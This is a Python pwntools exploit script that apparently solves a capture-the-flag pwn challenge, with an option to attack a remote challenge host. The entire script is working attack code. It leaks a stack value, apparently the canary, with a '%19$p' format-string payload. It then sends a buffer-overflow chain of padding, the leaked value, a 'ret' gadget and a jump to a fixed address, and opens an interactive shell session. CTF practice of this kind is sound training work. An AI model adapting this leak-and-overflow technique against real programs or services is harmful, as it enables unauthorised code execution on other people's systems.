from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

if args.REMOTE:
   HOST = '0.cloud.chals.io' 
   PORT=21558
else:
   pass

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process(e.path)


p = start()

p.recvuntil(b's time!')
p.sendline(b'%19$p')
p.recvline()
leak = int(p.recvline().strip(b'\n'),16)
log.info(f"Leak {hex(leak)}")


chain = cyclic(104)
chain += p64(leak)
chain += p64(0xdeadbeef)
chain += p64(r.find_gadget(['ret'])[0])
chain += p64(0x4011f6)

p.sendline(chain)

p.interactive()
